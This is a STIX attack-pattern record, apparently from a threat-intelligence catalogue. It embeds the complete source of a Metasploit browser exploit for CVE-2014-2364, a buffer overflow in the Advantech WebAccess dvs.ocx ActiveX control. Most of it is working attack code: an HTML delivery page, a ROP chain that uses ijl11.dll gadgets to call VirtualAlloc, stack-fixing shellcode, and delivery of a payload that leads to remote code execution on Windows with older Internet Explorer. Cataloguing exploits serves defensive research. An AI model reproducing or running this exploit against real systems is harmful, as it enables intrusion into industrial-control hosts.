{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9e9a692c-8325-459f-bced-5a517a02191b",
    "created": "2024-08-14T16:42:20.596992Z",
    "modified": "2024-08-14T16:42:20.596996Z",
    "name": "Advantech WebAccess dvs.ocx GetColor Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability in Advantec WebAccess. The vulnerability exists in the dvs.ocx ActiveX control, where a dangerous call to sprintf can be reached with user controlled data through the GetColor function. This module has been tested successfully on Windows XP SP3 with IE6 and Windows 7 SP1 with IE8 and IE 9.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/advantech_webaccess_dvs_getcolor.rb",
            "external_id": "advantech_webaccess_dvs_getcolor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2364"
        },
        {
            "source_name": "reference",
            "url": "http://ics-cert.us-cert.gov/advisories/ICSA-14-198-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Advantech WebAccess dvs.ocx GetColor Buffer Overflow',\n      'Description'         => %q{\n        This module exploits a buffer overflow vulnerability in Advantec WebAccess. The\n        vulnerability exists in the dvs.ocx ActiveX control, where a dangerous call to\n        sprintf can be reached with user controlled data through the GetColor function.\n        This module has been tested successfully on Windows XP SP3 with IE6 and Windows\n        7 SP1 with IE8 and IE 9.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Unknown', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2014-2364'],\n          ['ZDI', '14-255'],\n          ['URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-198-02']\n        ],\n      'DefaultOptions'      =>\n        {\n          'Retries'              => false,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :os_name => OperatingSystems::Match::WINDOWS,\n          :ua_name => /MSIE/i,\n          :ua_ver  => lambda { |ver| Rex::Version.new(ver) <  Rex::Version.new('10') },\n          :activex => [\n            {\n              clsid: \"{5CE92A27-9F6A-11D2-9D3D-000001155641}\",\n              method: \"GetColor\"\n            }\n          ]\n        },\n      'Payload'             =>\n        {\n          'Space'           => 1024,\n          'DisableNops'     => true,\n          'BadChars'        => \"\\x00\\x0a\\x0d\\x5c\",\n          # Patch the stack to execute the decoder...\n          'PrependEncoder'  => \"\\x81\\xc4\\x9c\\xff\\xff\\xff\", # add esp, -100\n          # Fix the stack again, this time better :), before the payload\n          # is executed.\n          'Prepend'         => \"\\x64\\xa1\\x18\\x00\\x00\\x00\" + # mov eax, fs:[0x18]\n                               \"\\x83\\xC0\\x08\"             + # add eax, byte 8\n                               \"\\x8b\\x20\"                 + # mov esp, [eax]\n                               \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\"  # add esp, -2000\n        },\n      'Platform'            => 'win',\n      'Arch'                => ARCH_X86,\n      'Targets'             =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget'       => 0,\n      'DisclosureDate'      => '2014-07-17'))\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Requested: #{request.uri}\")\n\n    content = <<-EOS\n<html>\n<head>\n<meta http-equiv=\"cache-control\" content=\"max-age=0\" />\n<meta http-equiv=\"cache-control\" content=\"no-cache\" />\n<meta http-equiv=\"expires\" content=\"0\" />\n<meta http-equiv=\"expires\" content=\"Tue, 01 Jan 1980 1:00:00 GMT\" />\n<meta http-equiv=\"pragma\" content=\"no-cache\" />\n</head>\n<body>\n<object classid='clsid:5CE92A27-9F6A-11D2-9D3D-000001155641' id='test' /></object>\n<script language='javascript'>\ntest.GetColor(\"#{rop_payload(get_payload(cli, target_info))}\", 0);\n</script>\n</body>\n</html>\n    EOS\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, content, {'Pragma' => 'no-cache'})\n  end\n\n  # Uses gadgets from ijl11.dll 1.1.2.16\n  def rop_payload(code)\n    xpl = rand_text_alphanumeric(61) # offset\n    xpl << [0x60014185].pack(\"V\")    # RET\n    xpl << rand_text_alphanumeric(8)\n\n    # EBX = dwSize (0x40)\n    xpl << [0x60012288].pack(\"V\") # POP ECX # RETN\n    xpl << [0xffffffff].pack(\"V\") # ecx value\n    xpl << [0x6002157e].pack(\"V\") # POP EAX # RETN\n    xpl << [0x9ffdafc9].pack(\"V\") # eax value\n    xpl << [0x60022b97].pack(\"V\") # ADC EAX,60025078 # RETN\n    xpl << [0x60024ea4].pack(\"V\") # MUL EAX,ECX # RETN 0x10\n    xpl << [0x60018084].pack(\"V\") # POP EBP # RETN\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << [0x60029f6c].pack(\"V\") # .data ijl11.dll\n    xpl << [0x60012288].pack(\"V\") # POP ECX # RETN\n    xpl << [0x60023588].pack(\"V\") # ECX => (&POP EBX # RETN)\n    xpl << [0x6001f1c8].pack(\"V\") # push edx # or al,39h # push ecx # or byte ptr [ebp+5], dh # mov eax, 1 # ret\n    # EDX = flAllocationType (0x1000)\n    xpl << [0x60012288].pack(\"V\") # POP ECX # RETN\n    xpl << [0xffffffff].pack(\"V\") # ecx value\n    xpl << [0x6002157e].pack(\"V\") # POP EAX # RETN\n    xpl << [0x9ffdbf89].pack(\"V\") # eax value\n    xpl << [0x60022b97].pack(\"V\") # ADC EAX,60025078 # RETN\n    xpl << [0x60024ea4].pack(\"V\") # MUL EAX,ECX # RETN 0x10\n    # ECX = flProtect (0x40)\n    xpl << [0x6002157e].pack(\"V\") # POP EAX # RETN\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << rand_text_alphanumeric(4) # padding\n    xpl << [0x60029f6c].pack(\"V\") # .data ijl11.dll\n    xpl << [0x60012288].pack(\"V\") # POP ECX # RETN\n    xpl << [0xffffffff].pack(\"V\") # ecx value\n    0x41.times do\n      xpl << [0x6001b8ec].pack(\"V\") # INC ECX # MOV DWORD PTR DS:[EAX],ECX # RETN\n    end\n    # EAX = ptr to &VirtualAlloc()\n    xpl << [0x6001db7e].pack(\"V\") # POP EAX # RETN [ijl11.dll]\n    xpl << [0x600250c8].pack(\"V\") # ptr to &VirtualAlloc() [IAT ijl11.dll]\n    # EBP = POP (skip 4 bytes)\n    xpl << [0x6002054b].pack(\"V\") # POP EBP # RETN\n    xpl << [0x6002054b].pack(\"V\") # ptr to &(# pop ebp # retn)\n    # ESI = ptr to JMP [EAX]\n    xpl << [0x600181cc].pack(\"V\") # POP ESI # RETN\n    xpl << [0x6002176e].pack(\"V\") # ptr to &(# jmp[eax])\n    # EDI = ROP NOP (RETN)\n    xpl << [0x60021ad1].pack(\"V\") # POP EDI # RETN\n    xpl << [0x60021ad2].pack(\"V\") # ptr to &(retn)\n    # ESP = lpAddress (automatic)\n    # PUSHAD # RETN\n    xpl << [0x60018399].pack(\"V\") # PUSHAD # RETN\n    xpl << [0x6001c5cd].pack(\"V\") # ptr to &(# push esp # retn)\n    xpl << code\n\n    xpl.gsub!(\"\\\"\", \"\\\\\\\"\") # Escape double quote, to not break javascript string\n    xpl.gsub!(\"\\\\\", \"\\\\\\\\\") # Escape back slash, to avoid javascript escaping\n\n    xpl\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-07-17",
    "x_mitre_platforms": [
        "win'"
    ]
}